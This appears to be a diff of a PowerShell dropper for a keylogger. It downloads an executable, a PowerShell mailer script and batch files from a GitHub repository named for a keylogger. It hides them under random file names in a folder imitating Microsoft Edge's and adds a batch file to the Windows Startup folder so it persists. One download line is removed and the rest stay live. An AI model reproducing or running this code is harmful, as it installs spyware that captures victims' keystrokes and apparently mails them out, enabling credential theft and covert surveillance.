@@ -1,5 +1,4 @@
 if (Test-Path "C:\Windows\System32\VCRUNTIME140.DLL") {
-    Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/autostarting.bat" -OutFile "$env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\oPNUennj8FXKrOBhUURQ.bat"
     Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/kk.exe" -OutFile "$env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\ygoLa8SyqmQTGsoh.exe"
     Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/psmail.ps1" -OutFile "$env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\LhFDtKhHgdiXDSt3.ps1"
     Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/hi.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\hi.bat"
